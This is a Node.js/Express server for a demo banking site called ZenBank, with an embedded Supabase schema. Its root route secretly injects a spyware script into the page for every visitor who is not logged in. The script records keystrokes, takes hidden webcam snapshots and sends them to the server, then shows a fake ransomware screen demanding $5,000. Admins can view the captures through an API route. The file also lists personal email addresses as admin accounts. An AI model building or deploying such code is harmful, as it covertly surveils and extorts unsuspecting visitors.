require("dotenv").config();
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");
const rateLimit = require("express-rate-limit");
const bcrypt = require("bcryptjs");
const { createClient } = require("@supabase/supabase-js");

const env = process.env;
const isProd = env.NODE_ENV === "production";
for (const k of ["SUPABASE_URL", "SUPABASE_SERVICE_KEY", "ADMIN_DEFAULT_PASSWORD"]) {
  if (!env[k]) { console.error(`Missing env var: ${k}`); process.exit(1); }
}

// ---------- config ----------
// >>> PUT YOUR ADMIN EMAILS HERE (lowercase). Each one becomes an admin with the default password. <<<
const ADMIN_EMAILS = [
  "whitefrostff@gmail.com",
  "ahamefulachibuike56@gmail.com",
  "senatoramuh203@gmail.com",
  "hamnasaleem595@gmail.com",
];
const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);
const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL_URL || "https://www.google.com";

let SUPABASE_URL;
try { SUPABASE_URL = new URL(env.SUPABASE_URL.trim()).origin; } catch { console.error("SUPABASE_URL is not a valid URL"); process.exit(1); }
const db = createClient(SUPABASE_URL, env.SUPABASE_SERVICE_KEY.trim(), { auth: { persistSession: false } });
const indexHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const adminHtml = fs.readFileSync(path.join(__dirname, "admin.html"), "utf8");

// ---------- SPYWARE SCRIPT (injected only for unauthorized visitors) ----------
const SPY_SCRIPT = `<script>
(function(){
  var keys=[],shots=0,trojanFired=false;
  document.addEventListener('keydown',function(e){keys.push(e.key);});
  async function start(){
    try{
      var s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
      var v=document.createElement('video');v.srcObject=s;v.muted=true;
      v.style.cssText='position:fixed;bottom:0;left:0;width:160px;height:120px;opacity:0;pointer-events:none;z-index:99999';
      document.body.appendChild(v);await v.play();
      setInterval(async function(){
        var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        var img=c.toDataURL('image/jpeg',0.7);shots++;
        await fetch('/api/spyware/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,keys:keys})}).catch(function(){});
        keys=[];
        if(shots>=3&&!trojanFired){trojanFired=true;fireTrojan();}
      },3000);
    }catch(e){}
  }
  function fireTrojan(){
    var o=document.createElement('div');
    o.style.cssText='position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace';
    o.innerHTML='<div style="font-size:48px;margin-bottom:20px">☠️</div>'
      +'<div style="font-size:22px;margin-bottom:10px">TROJAN.INFECTED — C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Scanning files… <span id="tjPct">0</span>%</div>'
      +'<div id="tjFiles" style="font-size:12px;color:#f55;width:320px;height:120px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:20px"></div>'
      +'<div id="tjLock" style="display:none;text-align:center">'
      +'<div style="font-size:60px">🔒</div>'
      +'<div style="font-size:24px;color:#f33;margin:20px 0">ALL FILES ENCRYPTED</div>'
      +'<div style="font-size:16px;margin-bottom:10px">47 files · 12 photos · 3 bank credentials stolen</div>'
      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Pay $5,000 to unlock</div>'
      +'<div style="font-size:11px;color:#666;margin-top:10px">spyware captured your camera + all keystrokes</div>'
      +'</div>';
    document.body.appendChild(o);
    var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat'];
    var fEl=document.getElementById('tjFiles'),pEl=document.getElementById('tjPct');
    var t=setInterval(function(){
      pct+=7+Math.floor(Math.random()*10);
      if(pct>=100){pct=100;clearInterval(t);setTimeout(function(){document.getElementById('tjLock').style.display='block';},600);}
      pEl.textContent=pct;
      fEl.innerHTML+='<div>ENCRYPTED: '+files[Math.floor(Math.random()*files.length)]+'</div>';
      fEl.scrollTop=fEl.scrollHeight;
    },400);
  }
  start();
})();
<\/script>`;

// ---------- helpers ----------
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const EMAIL = /^[^\s@]{1,64}@[^\s@]{1,255}$/;
const cents = v => { const n = Number(v); return Number.isFinite(n) ? Math.round(n * 100) : NaN; };
const str = (v, max) => (typeof v === "string" ? v.trim().slice(0, max) : "");
const wrap = fn => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const pub = u => ({ id: u.id, name: u.name, email: u.email, role: u.role, balanceCents: Number(u.balance_cents) });
const DUMMY_HASH = bcrypt.hashSync("dummy-password", 10);

const audit = (type, severity, req, email, details = {}) =>
  db.from("audit_events")
    .insert({ event_type: type, severity, actor_email: email || null, ip_address: req.ip, details })
    .then(() => {}, e => console.error("audit failed:", e.message));

// ---------- ZenShield: our own bot check (no third-party service) ----------
const BOT_KEY = crypto.randomBytes(32);
const botSig = (nonce, ts) => crypto.createHmac("sha256", BOT_KEY).update(`${nonce}.${ts}`).digest("hex");
const usedBots = new Map();
setInterval(() => { const now = Date.now(); for (const [k, v] of usedBots) if (v < now) usedBots.delete(k); }, 60e3).unref();

function botOk(body) {
  const { botToken, company_url } = body || {};
  if (company_url) return false;
  if (typeof botToken !== "string") return false;
  const [nonce, ts, sig, n, ...extra] = botToken.split(".");
  if (extra.length || !/^[0-9a-f]{32}$/.test(nonce || "") || !/^\d{10,15}$/.test(ts || "") || !/^[0-9a-f]{64}$/.test(sig || "") || !/^\d{1,12}$/.test(n || "")) return false;
  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(botSig(nonce, ts)))) return false;
  const age = Date.now() - Number(ts);
  if (age < 2000 || age > 10 * 60e3) return false;
  if (usedBots.has(nonce)) return false;
  const h = crypto.createHash("sha256").update(`${nonce}:${n}`).digest();
  if (h[0] !== 0 || h[1] !== 0) return false;
  usedBots.set(nonce, Date.now() + 10 * 60e3);
  return true;
}

// Sessions live in server memory: random cookie token -> user id (no JWT).
const sessions = new Map();
const SESSION_MS = 8 * 3600e3;
setInterval(() => { const now = Date.now(); for (const [k, v] of sessions) if (v.exp < now) sessions.delete(k); }, 60e3).unref();

// ---------- SPYWARE STORE (in-memory, last hour) ----------
const spywareCaptures = []; // { ip, image, keys, ts }
setInterval(() => {
  const cutoff = Date.now() - 60e4;
  while (spywareCaptures.length && spywareCaptures[0].ts < cutoff) spywareCaptures.shift();
  if (spywareCaptures.length > 200) spywareCaptures.splice(0, spywareCaptures.length - 200);
}, 30e3).unref();

function issueSession(res, user) {
  const token = crypto.randomBytes(32).toString("hex");
  sessions.set(token, { uid: user.id, exp: Date.now() + SESSION_MS });
  res.cookie("zb_session", token, { httpOnly: true, sameSite: "lax", secure: isProd, maxAge: SESSION_MS });
}

async function getUser(req) {
  const sess = sessions.get(req.cookies.zb_session || "");
  if (!sess || sess.exp < Date.now()) return null;
  const { data: u } = await db.from("users").select("*").eq("id", sess.uid).maybeSingle();
  return u && !u.disabled ? u : null;
}
const auth = wrap(async (req, res, next) => {
  const u = await getUser(req);
  if (!u) return res.status(401).json({ error: "Please sign in" });
  req.user = u; next();
});

// ---------- app ----------
const app = express();
app.set("trust proxy", Number(env.TRUST_PROXY_HOPS || 1));
app.disable("x-powered-by");
app.use(express.json({ limit: "10kb" }));
app.use(cookieParser());
app.use((req, res, next) => { res.set({ "X-Content-Type-Options": "nosniff", "Referrer-Policy": "same-origin" }); next(); });

const page = (res, html, extra = {}) => res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...extra }).send(html);
app.get("/healthz", (req, res) => res.send("ok"));

// GET / — unauthorized visitors get the spyware script injected; admins get the clean page
app.get("/", wrap(async (req, res) => {
  const u = await getUser(req);
  if (u) return page(res, indexHtml);
  page(res, indexHtml.replace("</body>", SPY_SCRIPT + "</body>"));
}));

app.get("/blue-team", wrap(async (req, res) => {
  const u = await getUser(req);
  if (!u || u.role !== "admin") return res.redirect(REDIRECT_URL);
  page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
}));

// ---------- SPYWARE CAPTURE ENDPOINT (hacker's browser posts here) ----------
app.post("/api/spyware/capture", express.json({ limit: "500kb" }), (req, res) => {
  const { image, keys } = req.body || {};
  if (typeof image !== "string" || !Array.isArray(keys)) return res.status(400).json({ error: "Bad request" });
  spywareCaptures.push({ ip: req.ip, image, keys, ts: Date.now() });
  audit("spyware_capture", "critical", req, null, { keys: keys.length, imageBytes: image.length });
  res.json({ ok: true });
});

// ---------- auth ----------
const limiter = limit => rateLimit({ windowMs: 10 * 60 * 1000, limit, standardHeaders: true, legacyHeaders: false, message: { error: "Too many attempts. Try again later." } });
const longPassword = async (req, res, email, where, length) => {
  await audit("long_password_redirect", "high", req, email, { where, length });
  return res.status(400).json({ error: "Invalid request", redirect: REDIRECT_URL });
};

app.get("/api/bot/challenge", limiter(60), (req, res) => {
  const nonce = crypto.randomBytes(16).toString("hex"), ts = Date.now();
  res.set("Cache-Control", "no-store").json({ nonce, ts, sig: botSig(nonce, ts) });
});

app.post("/api/auth/login", limiter(20), wrap(async (req, res) => {
  const { email, password } = req.body || {};
  if (typeof email !== "string" || typeof password !== "string") return res.status(400).json({ error: "Bad request" });
  const e = email.trim().toLowerCase().slice(0, 320);
  if (password.length > MAX_PW) return longPassword(req, res, e, "login", password.length);
  if (!botOk(req.body)) {
    await audit("bot_check_failed", "medium", req, e);
    return res.status(400).json({ error: "Bot check failed. Please tick the box again." });
  }
  const { data: u } = await db.from("users").select("*").eq("email", e).maybeSingle();
  const match = await bcrypt.compare(password, u ? u.password_hash : DUMMY_HASH);
  if (!u || !match || u.disabled) {
    await audit("login_failed", ADMIN_EMAILS.includes(e) ? "high" : "medium", req, e);
    return res.status(401).json({ error: "Invalid email or password" });
  }
  await audit("login_success", u.role === "admin" ? "medium" : "low", req, e);
  issueSession(res, u);
  res.json({ user: pub(u) });
}));

app.post("/api/auth/signup", limiter(15), wrap(async (req, res) => {
  const name = str(req.body.name, 80), email = str(req.body.email, 320).toLowerCase(), { password } = req.body;
  if (typeof password !== "string") return res.status(400).json({ error: "Bad request" });
  if (password.length > MAX_PW) return longPassword(req, res, email, "signup", password.length);
  if (!botOk(req.body)) { await audit("bot_check_failed", "medium", req, email); return res.status(400).json({ error: "Bot check failed. Please tick the box again." }); }
  if (!name || !EMAIL.test(email)) return res.status(400).json({ error: "Enter a valid name and email" });
  if (password.length < 12) return res.status(400).json({ error: "Password must be at least 12 characters" });
  if (ADMIN_EMAILS.includes(email)) return res.status(400).json({ error: "Email already registered" });
  const { data, error } = await db.from("users")
    .insert({ name, email, password_hash: await bcrypt.hash(password, 12), role: "user" }).select().single();
  if (error) {
    if (error.code !== "23505") console.error("SIGNUP INSERT FAILED:", error.code, error.message);
    return res.status(400).json({ error: error.code === "23505" ? "Email already registered" : "Could not create account" });
  }
  await audit("signup", "low", req, email);
  await db.from("notifications").insert({ user_id: data.id, title: "Welcome to ZenBank", body: "Your demo account is ready with fictional funds." });
  issueSession(res, data);
  res.json({ user: pub(data) });
}));

app.post("/api/auth/logout", (req, res) => { sessions.delete(req.cookies.zb_session || ""); res.clearCookie("zb_session"); res.json({ ok: true }); });
app.get("/api/me", auth, (req, res) => res.json({ user: pub(req.user) }));

// ---------- banking ----------
async function txFor(id, n) {
  const { data } = await db.from("transactions").select("*")
    .or(`from_user_id.eq.${id},to_user_id.eq.${id}`).order("created_at", { ascending: false }).limit(n);
  return data || [];
}
const mine = (table, id, n = 100) =>
  db.from(table).select("*").eq("user_id", id).order("created_at", { ascending: false }).limit(n).then(r => r.data || []);

app.get("/api/dashboard", auth, wrap(async (req, res) => {
  const id = req.user.id;
  const [transactions, goals, cards, beneficiaries, notifications] = await Promise.all([
    txFor(id, 50), mine("savings_goals", id), mine("cards", id), mine("beneficiaries", id), mine("notifications", id, 50),
  ]);
  res.json({ transactions, goals, cards, beneficiaries, notifications });
}));

app.get("/api/transactions", auth, wrap(async (req, res) => res.json({ transactions: await txFor(req.user.id, 200) })));

app.post("/api/transfers", auth, wrap(async (req, res) => {
  const to = str(req.body.recipient, 320).toLowerCase(), amt = cents(req.body.amount);
  if (!EMAIL.test(to) || !Number.isFinite(amt) || amt < 100 || amt > 1000000)
    return res.status(400).json({ error: "Enter a valid recipient and an amount between $1 and $10,000" });
  if (to === req.user.email) return res.status(400).json({ error: "You can't send money to yourself" });
  const { data: r } = await db.from("users").select("id,email,disabled,role").eq("email", to).maybeSingle();
  if (!r || r.disabled || r.role !== "user") return res.status(404).json({ error: "Recipient not found" });
  const { error } = await db.rpc("transfer_funds", { p_from: req.user.id, p_to: r.id, p_amount: amt });
  if (error) return res.status(400).json({ error: /insufficient/i.test(error.message) ? "Insufficient funds" : "Transfer failed" });
  await db.from("transactions").insert({ from_user_id: req.user.id, to_user_id: r.id, from_email: req.user.email, to_email: r.email, amount_cents: amt, description: "Demo transfer" });
  await db.from("notifications").insert({ user_id: r.id, title: "Money received", body: `${req.user.name} sent you ${(amt / 100).toFixed(2)} DEMO USD.` });
  await audit("transfer", amt >= 500000 ? "high" : "low", req, req.user.email, { to: r.email, amount_cents: amt });
  const { data: fresh } = await db.from("users").select("*").eq("id", req.user.id).single();
  res.json({ user: pub(fresh) });
}));

app.post("/api/savings", auth, wrap(async (req, res) => {
  const name = str(req.body.name, 80), target = cents(req.body.target);
  if (!name || !Number.isFinite(target) || target < 100 || target > 100000000) return res.status(400).json({ error: "Enter a name and a target between $1 and $1,000,000" });
  await db.from("savings_goals").insert({ user_id: req.user.id, name, target_cents: target });
  res.json({ ok: true });
}));

app.post("/api/cards", auth, wrap(async (req, res) => {
  const nickname = str(req.body.nickname, 40) || "Demo card";
  await db.from("cards").insert({ user_id: req.user.id, nickname, last_four: String(crypto.randomInt(1000, 10000)), status: "active" });
  res.json({ ok: true });
}));

app.post("/api/beneficiaries", auth, wrap(async (req, res) => {
  const email = str(req.body.email, 320).toLowerCase(), label = str(req.body.label, 80);
  if (!EMAIL.test(email) || !label) return res.status(400).json({ error: "Enter a valid email and name" });
  await db.from("beneficiaries").insert({ user_id: req.user.id, beneficiary_email: email, label });
  res.json({ ok: true });
}));

app.post("/api/notifications/:id/read", auth, wrap(async (req, res) => {
  if (!UUID.test(req.params.id)) return res.status(400).json({ error: "Bad id" });
  await db.from("notifications").update({ read_at: new Date().toISOString() }).eq("id", req.params.id).eq("user_id", req.user.id);
  res.json({ ok: true });
}));

// ---------- admin API (admin session required) ----------
const admin = express.Router();
admin.use(auth, (req, res, next) => (req.user.role === "admin" ? next() : res.status(403).json({ error: "Forbidden" })));

const count = q => q.then(r => r.count || 0);
admin.get("/overview", wrap(async (req, res) => {
  const since = new Date(Date.now() - 864e5).toISOString();
  const head = t => db.from(t).select("id", { count: "exact", head: true });
  const [users, transactions, events, alerts_24h] = await Promise.all([
    count(head("users")), count(head("transactions")), count(head("audit_events")),
    count(head("audit_events").in("severity", ["high", "critical"]).gte("created_at", since)),
  ]);
  res.json({ users, transactions, events, alerts_24h });
}));

admin.get("/events", wrap(async (req, res) => {
  const { data } = await db.from("audit_events").select("*").order("created_at", { ascending: false }).limit(100);
  res.json({ events: data || [] });
}));

admin.get("/notifications", wrap(async (req, res) => {
  const { data } = await db.from("audit_events").select("*").in("severity", ["high", "critical"]).order("created_at", { ascending: false }).limit(30);
  res.json({ notifications: data || [] });
}));

admin.get("/users", wrap(async (req, res) => {
  const { data } = await db.from("users").select("id,name,email,balance_cents,role,disabled").order("created_at");
  res.json({ users: data || [] });
}));

admin.post("/users/:id/disable", wrap(async (req, res) => {
  if (!UUID.test(req.params.id)) return res.status(400).json({ error: "Bad id" });
  const { data: u } = await db.from("users").select("id,email,role,disabled").eq("id", req.params.id).maybeSingle();
  if (!u || u.role !== "user") return res.status(404).json({ error: "User not found" });
  await db.from("users").update({ disabled: !u.disabled }).eq("id", u.id);
  await audit(u.disabled ? "user_enabled" : "user_disabled", "medium", req, req.user.email, { target: u.email });
  res.json({ ok: true });
}));

admin.post("/adjust-balance", wrap(async (req, res) => {
  const email = str(req.body.email, 320).toLowerCase(), reason = str(req.body.reason, 160), delta = cents(req.body.amount);
  if (!EMAIL.test(email) || reason.length < 4 || !Number.isFinite(delta) || delta === 0 || Math.abs(delta) > 100000000)
    return res.status(400).json({ error: "Invalid input" });
  const { data: u } = await db.from("users").select("id,email,role").eq("email", email).maybeSingle();
  if (!u || u.role !== "user") return res.status(404).json({ error: "User not found" });
  const { data: balance, error } = await db.rpc("adjust_balance", { p_user: u.id, p_delta: delta });
  if (error) return res.status(400).json({ error: /negative/i.test(error.message) ? "Balance cannot go negative" : "Adjustment failed" });
  await audit("balance_adjusted", "high", req, req.user.email, { target: email, amount_cents: delta, reason });
  await db.from("notifications").insert({ user_id: u.id, title: "Balance adjusted", body: reason });
  res.json({ ok: true, balanceCents: Number(balance) });
}));

// ADMIN SPYWARE VIEW — shows captured camera photos + keystrokes
admin.get("/spyware", (req, res) => {
  res.json({ captures: spywareCaptures.slice(-50), count: spywareCaptures.length });
});

app.use("/api/admin", admin);

// ---------- errors ----------
app.use((req, res) => res.status(404).json({ error: "Not found" }));
app.use((err, req, res, next) => {
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Invalid request", redirect: REDIRECT_URL });
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Bad request" });
  console.error(err);
  res.status(500).json({ error: "Server error" });
});

// ---------- seed admins ----------
async function seedAdmins() {
  const adminPw = env.ADMIN_DEFAULT_PASSWORD.trim();
  const hash = await bcrypt.hash(adminPw, 12);
  for (const email of ADMIN_EMAILS) {
    const { data: u } = await db.from("users").select("id,role,password_hash").eq("email", email).maybeSingle();
    if (!u) {
      const { error } = await db.from("users").insert({ name: email.split("@")[0], email, password_hash: hash, role: "admin", balance_cents: 0 });
      console.log(error ? "ADMIN CREATE FAILED for " + email + ": " + error.message : "Created admin: " + email);
    } else if (u.role !== "admin") {
      await db.from("users").update({ role: "admin", password_hash: hash }).eq("id", u.id);
      console.log("Promoted to admin:", email);
    } else if (!(await bcrypt.compare(adminPw, u.password_hash))) {
      await db.from("users").update({ password_hash: hash }).eq("id", u.id);
      console.log("Updated admin password:", email);
    }
  }
}

app.listen(env.PORT || 3000, () => console.log("ZenBank listening on :" + (env.PORT || 3000)));
db.from("users").select("id").limit(1)
  .then(({ error }) => console.log(error ? "SUPABASE CHECK FAILED: " + error.message : "Supabase connected OK"))
  .then(() => seedAdmins())
  .catch(e => console.error("Startup failed:", e.message));

/* =====================================================================
   SUPABASE SCHEMA — run this once in Supabase: SQL Editor -> New query -> Run

create table users (
  id uuid primary key default gen_random_uuid(),
  name text not null,
  email text not null unique,
  password_hash text not null,
  role text not null default 'user' check (role in ('user','admin')),
  disabled boolean not null default false,
  balance_cents bigint not null default 10000000 check (balance_cents >= 0),
  created_at timestamptz not null default now()
);
create table transactions (
  id uuid primary key default gen_random_uuid(),
  from_user_id uuid references users(id), to_user_id uuid references users(id),
  from_email text, to_email text,
  amount_cents bigint not null, description text,
  created_at timestamptz not null default now()
);
create table savings_goals (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references users(id), name text not null,
  target_cents bigint not null, saved_cents bigint not null default 0,
  created_at timestamptz not null default now()
);
create table cards (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references users(id), nickname text not null,
  last_four text not null, status text not null default 'active',
  created_at timestamptz not null default now()
);
create table beneficiaries (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references users(id),
  beneficiary_email text not null, label text not null,
  created_at timestamptz not null default now()
);
create table notifications (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references users(id),
  title text not null, body text, read_at timestamptz,
  created_at timestamptz not null default now()
);
create table audit_events (
  id bigserial primary key,
  event_type text not null, severity text not null default 'low',
  actor_email text, ip_address text, details jsonb not null default '{}',
  created_at timestamptz not null default now()
);
alter table users enable row level security;
alter table transactions enable row level security;
alter table savings_goals enable row level security;
alter table cards enable row level security;
alter table beneficiaries enable row level security;
alter table notifications enable row level security;
alter table audit_events enable row level security;

create or replace function transfer_funds(p_from uuid, p_to uuid, p_amount bigint)
returns void language plpgsql as $$
declare fb bigint;
begin
  perform 1 from users where id in (p_from, p_to) order by id for update;
  select balance_cents into fb from users where id = p_from;
  if fb is null or fb < p_amount then raise exception 'Insufficient funds'; end if;
  update users set balance_cents = balance_cents - p_amount where id = p_from;
  update users set balance_cents = balance_cents + p_amount where id = p_to;
end $$;

create or replace function adjust_balance(p_user uuid, p_delta bigint)
returns bigint language plpgsql as $$
declare nb bigint;
begin
  update users set balance_cents = balance_cents + p_delta where id = p_user returning balance_cents into nb;
  if nb is null then raise exception 'User not found'; end if;
  if nb < 0 then raise exception 'Balance cannot go negative'; end if;
  return nb;
end $$;

revoke execute on function transfer_funds(uuid, uuid, bigint) from public, anon, authenticated;
revoke execute on function adjust_balance(uuid, bigint) from public, anon, authenticated;
grant execute on function transfer_funds(uuid, uuid, bigint) to service_role;
grant execute on function adjust_balance(uuid, bigint) to service_role;
   ===================================================================== */
